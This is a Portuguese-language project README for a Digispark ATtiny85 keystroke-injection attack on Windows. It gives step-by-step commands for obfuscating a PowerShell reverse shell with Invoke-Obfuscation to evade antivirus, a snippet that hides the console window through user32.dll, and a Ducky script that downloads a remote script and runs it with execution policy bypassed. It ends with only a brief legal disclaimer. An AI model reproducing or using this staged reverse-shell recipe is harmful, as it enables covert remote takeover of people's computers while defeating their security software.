# Digispark Stealth Reverse Shell (AV Bypass)

Este projeto demonstra um vetor de ataque físico utilizando o microcontrolador **Digispark ATtiny85** (HID) para executar um **Reverse Shell** em sistemas Windows, utilizando técnicas avançadas de ofuscação para o bypass de soluções antivírus modernas.

## 🚀 Visão Geral

O projeto consiste em um payload dividido em estágios que utiliza a emulação de teclado (HID) para baixar e executar um script PowerShell altamente ofuscado diretamente na memória do sistema alvo.

### Características Principais

* **Execução Fileless-like:** O payload final é baixado e executado sem tocar o disco permanentemente em formatos executáveis comuns.
* **Bypass de AV:** Utiliza a ferramenta `Invoke-Obfuscation` para mascarar assinaturas estáticas.
* **Janela Oculta:** Implementação de chamadas de API nativas do Windows (`user32.dll`) via PowerShell para esconder o terminal instantaneamente.
* **Compatibilidade ABNT2:** Configurado para teclados brasileiros utilizando o mapeamento de recursos do `duck2spark`.

---

## 🛠️ Pré-requisitos

### Hardware

* Microcontrolador Digispark (ATtiny85).
* Cabo USB ou conexão direta.

### Software

* [Arduino IDE](https://www.arduino.cc/en/software) (com suporte a placas Digistump).
* [PowerShell Core (pwsh)](https://www.kali.org/tools/powershell/) (se estiver no Linux).
* [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation).
* [duck2spark & Encoder ABNT2](https://github.com/gfbalestrin/duck2spark_abnt2).

---

## 📖 Fluxo de Trabalho (Workflow)

### 1. Geração e Ofuscação do Shell

Primeiro, gera-se um shell reverso para PowerShell (Base64). Em seguida, utilizamos o `Invoke-Obfuscation` para tratar o script:

```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
set scriptblock [SEU_CODIGO_BASE64]

```

*(Escolha técnicas como TOKEN ou STRING para garantir a evasão)*.

### 2. Preparação do Script Stealth (.ps1)

O script final deve conter o código para ocultar a janela do terminal antes de executar a lógica do shell:

```powershell
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
# Insira seu código ofuscado abaixo

```

.

### 3. Configuração do Digispark

Crie um arquivo `.duck` para automatizar o download do script hospedado (ex: Dropbox/GDrive com link direto):

```ducky
DELAY 1000
GUI r
DELAY 1000
STRING powershell -w h -NoP -NonI -Exec Bypass $U='LINK_DIRETO';$P="$env:TEMP"+'\shl.ps1';iwr -Uri $U -O $P; powershell -ExecutionPolicy Bypass -File $P
DELAY 2000
ENTER
DELAY 500

```

.

### 4. Compilação e Upload

Converta o script para o formato do Arduino e faça o upload:

```bash
java -jar encoder.jar -i "arquivo.duck" -o shell.bin -l resources\br.properties
python duck2spark.py -i shell.bin -l 1 -f 2000 -o shell\shell.ino

```

.

No Arduino IDE, selecione a placa **Digispark (Default - 16.5mhz)** e realize o upload.

---

## ⚠️ Aviso Legal (Disclaimer)

Este software foi desenvolvido apenas para fins educacionais e testes de segurança autorizados. O uso deste material para atacar alvos sem consentimento prévio é ilegal. O autor não se responsabiliza por quaisquer danos ou uso indevido deste projeto.
